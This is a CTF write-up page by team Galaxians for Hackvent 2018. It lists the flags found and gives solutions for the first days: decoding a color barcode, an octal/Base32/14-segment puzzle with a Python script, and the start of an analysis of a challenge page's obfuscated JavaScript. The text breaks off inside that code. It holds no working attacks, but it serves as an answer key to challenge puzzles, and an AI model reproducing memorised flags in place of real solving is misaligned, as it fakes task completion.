<!doctype html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Hackvent 2018" /><meta property="og:locale" content="en" /><meta name="description" content="A set of CTF writeups by team Galaxians." /><meta property="og:description" content="A set of CTF writeups by team Galaxians." /><link rel="canonical" href="https://shiltemann.github.io/CTF-writeups-public/writeups/Hackvent_2018/" /><meta property="og:url" content="https://shiltemann.github.io/CTF-writeups-public/writeups/Hackvent_2018/" /><meta property="og:site_name" content="Galaxians CTF" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2018-12-01T00:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackvent 2018" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-05-17T20:19:52+02:00","datePublished":"2018-12-01T00:00:00+01:00","description":"A set of CTF writeups by team Galaxians.","headline":"Hackvent 2018","mainEntityOfPage":{"@type":"WebPage","@id":"https://shiltemann.github.io/CTF-writeups-public/writeups/Hackvent_2018/"},"url":"https://shiltemann.github.io/CTF-writeups-public/writeups/Hackvent_2018/"}</script><title> Galaxians CTF | Hackvent 2018</title><link rel="apple-touch-icon" sizes="180x180" href="/CTF-writeups-public/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/CTF-writeups-public/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/CTF-writeups-public/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/CTF-writeups-public/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/CTF-writeups-public/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Galaxians CTF"><meta name="application-name" content="Galaxians CTF"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/CTF-writeups-public/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/all.min.css"><link rel="stylesheet" href="/CTF-writeups-public/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/CTF-writeups-public/" class="mx-auto"> <img src="/CTF-writeups-public/assets/img/galaxians-logo.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/CTF-writeups-public/">Galaxians CTF</a></div><div class="site-subtitle font-italic">Galactic Girlfiends Hack the Universe!</div></div><ul class="w-100"><li class="nav-item"> <a href="/CTF-writeups-public/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>CTF EVENTS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/posts/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>POSTS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/shiltemann" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['galaxians','galaxians.org'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/CTF-writeups-public/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/CTF-writeups-public/"> Home </a> </span> <span>Hackvent 2018</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Ctf-event</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </span> <span id="search-cancel">Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1> Hackvent 2018</h1><div class="post-content"><h1>Overview</h1><div class="table-wrapper"><div class="table-wrapper"><table><thead><tr><th>Challenge<th>Difficulty<th>Category<th>Flag<tbody><tr><td><a href="#day-01-just-another-bar-code">Day 01: Just Another Bar Code</a><td>easy<td><td><code>HV18-L3ts-5t4r-7Th3-Phun-G33k</code><tr><td><a href="#day-02-me">Day 02: Me</a><td>easy<td><td><code>HL18-7QTH-JZ1K-JKSD-GPEB-GJPU</code><tr><td><a href="#day-03-catch-me">Day 03: Catch Me</a><td>easy<td><td><code>HV18-pFAT-O1Dl-HjVp-jJNE-Zju8</code><tr><td><a href="#day-04-pirating-like-in-the-90ies">Day 04: pirating like in the 90ies</a><td>easy<td><td><code>HV18-5o9x-4geL-7hkJ-wc4A-xp8F</code><tr><td><a href="#day-05-osint-1">Day 05: OSINT 1</a><td>easy<td><td><code>HV18-0Sin-tI5S-R34l-lyC0-oo0L</code><tr><td><a href="#day-06-mondrian">Day 06: Mondrian</a><td>easy<td><td><code>HV18-M4ke-S0m3-R3Al-N1c3-artZ</code><tr><td><a href="#day-07-flappy-pl">Day 07: flappy.pl</a><td>easy<td><td><code>HV18-bMnF-racH-XdMC-xSJJ-I2fL</code><tr><td><a href="#day-08-advent-snail">Day 08: Advent Snail</a><td>medium<td><td><code>HV18-$$nn-@@11-LLr0-B1ne</code><tr><td><a href="#day-09-fake-xmass-balls">Day 09: fake xmass balls</a><td>medium<td><td><code>HV18-PpTR-Qri5-3nOI-n51a-42gJ</code><tr><td><a href="#day-10-gt-run-node-run">Day 10: &gt;_ Run, Node, Run</a><td>medium<td><td><code>HV18-YtH3-S4nD-bx5A-Nt4G</code><tr><td><a href="#day-11-crypt-o-math-3-0">Day 11: Crypt-o-math 3.0</a><td>medium<td><td><code>HV18-xLvY-TeNT-YgEh-wBuL-bFfz</code><tr><td><a href="#day-12-smartwishlist">Day 12: SmartWishList</a><td>medium<td><td> unsolved<tr><td><a href="#day-13-flappy-s-revenge">Day 13: flappy’s revenge</a><td>medium<td><td><code>HV18-9hYf-LSY1-hWdZ-496n-Mbda</code><tr><td><a href="#day-14-power-in-the-shell">Day 14: Power in the Shell</a><td>medium<td><td> unsolved<tr><td><a href="#day-15-watch-me">Day 15: Watch me</a><td>hard<td><td> unsolved<tr><td><a href="#day-16-pay-100-bitcoins">Day 16: Pay 100 Bitcoins</a><td>hard<td><td> unsolved<tr><td><a href="#day-17-faster-key-exchange">Day 17: Faster KEy Exchange</a><td>hard<td><td> unsolved<tr><td><a href="#day-18-be-evil">Day 18: Be Evil</a><td>hard<td><td> unsolved<tr><td><a href="#day-19-promocode">Day 19: PromoCode</a><td>hard<td><td> unsolved<tr><td><a href="#day-20-i-want-to-play-a-game">Day 20: I want to play a game</a><td>hard<td><td> unsolved<tr><td><a href="#day-21-muffinctf">Day 21: MuffinCTF</a><td>hard<td><td> unsolved<tr><td><a href="#day-22-muffinctf">Day 22: MuffinCTF</a><td>hard<td><td> unsolved<tr><td><a href="#day-23-muffinctf">Day 23: MuffinCTF</a><td>hard<td><td> unsolved<tr><td><a href="#day-24-take-the-red-pill-take-the-blue-pill">Day 24: Take the red pill, take the blue pill</a><td>hard<td><td> unsolved<tr><td><a href="#teaser">Teaser</a><td><td><td> unsolved</table></div></div><h1 id="day-01-just-another-bar-code"> Day 01: Just Another Bar Code <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-01-just-another-bar-code.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>After a decade of monochromity, Santa has finally updated his infrastructure with color displays.</p><p><img src="writeupfiles/HV18_Ball_Day1_color.png" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>After some Googling, we find JAB Code (Just Another Bar Code) which is a high-capacity 2D color bar code, which can encode more data than traditional black/white (QR) codes.</p><ul><li><a href="https://github.com/jabcode/jabcode">GitHub repo</a><li><a href="https://jabcode.org/scan">Online Decoder</a></ul><p>Their online decoder gives us the flag</p><h2> Flag</h2><code> HV18-L3ts-5t4r-7Th3-Phun-G33k </code><hr><h1 id="day-02-me"> Day 02: Me <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-02-me.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Can you help Santa decoding these numbers?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>115 112 122 127 113 132 124 110 107 106 124 124 105 111 104 105 115 126 124 103 101 131
124 104 116 111 121 107 103 131 124 104 115 122 123 127 115 132 132 122 115 64 132 103
101 132 132 122 115 64 132 103 101 131 114 113 116 121 121 107 103 131 124 104 115 122
123 127 115 63 112 101 115 106 125 127 131 111 104 103 115 116 123 127 115 132 132 122
115 64 132 103 101 132 132 122 115 64 132 103 101 131 114 103 115 116 123 107 113 111
104 102 115 122 126 107 127 111 104 103 115 116 126 103 101 132 114 107 115 64 131 127
125 63 112 101 115 64 131 127 117 115 122 101 115 106 122 107 107 132 104 106 105 102
123 127 115 132 132 122 116 112 127 123 101 131 114 104 115 122 124 124 105 62 102 101
115 106 122 107 107 132 104 112 116 121 121 107 117 115 114 110 107 111 121 107 103 131
63 105 115 126 124 107 117 115 122 101 115 106 122 107 113 132 124 110 107 106 124 124
105 111 104 102 115 122 123 127 115 132 132 122 115 64 132 103 101 131 114 103 115 116
123 107 117 115 124 112 116 121 121 107 117 115 114 110 107 111 121 107 103 131 63 105
115 126 124 107 117 115 122 101 115 106 122 107 107 132 104 106 105 102 121 127 105 132
114 107 115 64 131 127 117 115 122 101 115 112 122 127 111 132 114 107 105 101 75 75
75 75 75 75
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>A series of decodings</p><ul><li>Octal<li>Base32<li>14-segment display</ul><p>Decoding script <a href="writeupfiles/day02.py">day02.py</a>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">base64</span>

<span class="nb">input</span><span class="o">=</span> <span class="sh">"</span><span class="s">115 112 122 127 113 132 124 110 107 106 124 124 105 111 104 105 115 126 124 103 101 131 124 104 116 111 121 107 103 131 124 104 115 122 123 127 115 132 132 122 115 64 132 103 101 132 132 122 115 64 132 103 101 131 114 113 116 121 121 107 103 131 124 104 115 122 123 127 115 63 112 101 115 106 125 127 131 111 104 103 115 116 123 127 115 132 132 122 115 64 132 103 101 132 132 122 115 64 132 103 101 131 114 103 115 116 123 107 113 111 104 102 115 122 126 107 127 111 104 103 115 116 126 103 101 132 114 107 115 64 131 127 125 63 112 101 115 64 131 127 117 115 122 101 115 106 122 107 107 132 104 106 105 102 123 127 115 132 132 122 116 112 127 123 101 131 114 104 115 122 124 124 105 62 102 101 115 106 122 107 107 132 104 112 116 121 121 107 117 115 114 110 107 111 121 107 103 131 63 105 115 126 124 107 117 115 122 101 115 106 122 107 113 132 124 110 107 106 124 124 105 111 104 102 115 122 123 127 115 132 132 122 115 64 132 103 101 131 114 103 115 116 123 107 117 115 124 112 116 121 121 107 117 115 114 110 107 111 121 107 103 131 63 105 115 126 124 107 117 115 122 101 115 106 122 107 107 132 104 106 105 102 121 127 105 132 114 107 115 64 131 127 117 115 122 101 115 112 122 127 111 132 114 107 105 101 75 75 75 75 75 75</span><span class="sh">"</span>

<span class="c1"># looks like ascii encoded in octal
</span>
<span class="n">output1</span> <span class="o">=</span> <span class="sh">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">input</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">):</span>
    <span class="n">output1</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">output1: </span><span class="sh">'</span><span class="p">,</span> <span class="n">output1</span><span class="p">)</span>

<span class="c1"># looks like base32
</span>
<span class="n">output2</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b32decode</span><span class="p">(</span><span class="n">output1</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">output2: </span><span class="sh">'</span><span class="p">,</span> <span class="n">output2</span><span class="p">.</span><span class="nf">upper</span><span class="p">())</span>

<span class="c1"># now what..?
</span></pre></table></code></div></div><p>This outputs:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>output1:  MJRWKZTHGFTTEIDEMVTCAYTDNIQGCYTDMRSWMZZRM4ZCAZZRM4ZCAYLKNQQGCYTDMRSWM3JAMFUWYIDCMNSWMZZRM4ZCAZZRM4ZCAYLCMNSGKIDBMRVGWIDCMNVCAZLGM4YWU3JAM4YWOMRAMFRGGZDFEBSWMZZRNJWSAYLDMRTTE2BAMFRGGZDJNQQGOMLHGIQGCY3EMVTGOMRAMFRGKZTHGFTTEIDBMRSWMZZRM4ZCAYLCMNSGOMTJNQQGOMLHGIQGCY3EMVTGOMRAMFRGGZDFEBQWEZLGM4YWOMRAMJRWIZLGEA======
output2:  b'BCEFG1G2 DEF BCJ ABCDEFG1G2 G1G2 AJL ABCDEFM AIL BCEFG1G2 G1G2 ABCDE ADJK BCJ EFG1JM G1G2 ABCDE EFG1JM ACDG2H ABCDIL G1G2 ACDEFG2 ABEFG1G2 ADEFG1G2 ABCDG2IL G1G2 ACDEFG2 ABCDE ABEFG1G2 BCDEF '
</pre></table></code></div></div><p>This last bit seems to be 14-segment display code, which can be solved with <a href="https://www.geocachingtoolbox.com/index.php?lang=en&amp;page=segmentDisplay">this tool</a> from the geocaching toolbox:</p><p><img src="writeupfiles/day02-14segment-decode.jpg" alt="" /></p><p>And <a href="http://kryptografie.de/kryptografie/chiffre/14-segment.htm">this site</a> decodes to text directly, giving us the flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>HL18-7QTH-JZ1K-JKSD-GPEB-GJPU
</pre></table></code></div></div><p>(The <code class="language-plaintext highlighter-rouge">HL18</code> at the start seems to just have been a mistake, and the flag is accepted like this)</p><h2> Flag</h2><code> HL18-7QTH-JZ1K-JKSD-GPEB-GJPU </code><hr><h1 id="day-03-catch-me"> Day 03: Catch Me <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-03-catch-me.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><em>..if you can</em></p><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>To get the flag, just press the button</p><p><a href="https://hackvent.hacking-lab.com/C4tchM3_dizzle/">Catch me</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The link led to a website with a button to click to get the flag</p><p><img src="writeupfiles/day03-screenshot0.png" alt="" /></p><p>But the button moves away as you approach it with the mouse, and if you try using just the keyboard or a touch screen, you get the following message:</p><p><img src="writeupfiles/day03-screenshot1.png" alt="" /></p><p>There is some heavily obfuscated javascript on the page:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">_0x766f</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="se">\</span><span class="s2">x47</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x63</span><span class="se">\</span><span class="s2">x6B</span><span class="se">\</span><span class="s2">x21</span><span class="se">\</span><span class="s2">x0A</span><span class="se">\</span><span class="s2">x0A</span><span class="se">\</span><span class="s2">x54</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x77</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x62</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x79</span><span class="se">\</span><span class="s2">x2C</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x77</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x27</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x3F</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x53</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x79</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x66</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x2E</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x43</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x21</span><span class="se">\</span><span class="s2">x0A</span><span class="se">\</span><span class="s2">x0A</span><span class="se">\</span><span class="s2">x59</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x66</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x3A</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x48</span><span class="se">\</span><span class="s2">x56</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">x38</span><span class="se">\</span><span class="s2">x2D</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x46</span><span class="se">\</span><span class="s2">x41</span><span class="se">\</span><span class="s2">x54</span><span class="se">\</span><span class="s2">x2D</span><span class="se">\</span><span class="s2">x4F</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">x44</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x2D</span><span class="se">\</span><span class="s2">x48</span><span class="se">\</span><span class="s2">x6A</span><span class="se">\</span><span class="s2">x56</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x2D</span><span class="se">\</span><span class="s2">x6A</span><span class="se">\</span><span class="s2">x4A</span><span class="se">\</span><span class="s2">x4E</span><span class="se">\</span><span class="s2">x45</span><span class="se">\</span><span class="s2">x2D</span><span class="se">\</span><span class="s2">x5A</span><span class="se">\</span><span class="s2">x6A</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x38</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x63</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x63</span><span class="se">\</span><span class="s2">x6B</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x23</span><span class="se">\</span><span class="s2">x62</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x6E</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x77</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x68</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x74</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x57</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x68</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x48</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x74</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x7A</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x77</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x63</span><span class="se">\</span><span class="s2">x68</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x76</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x44</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x66</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x74</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span 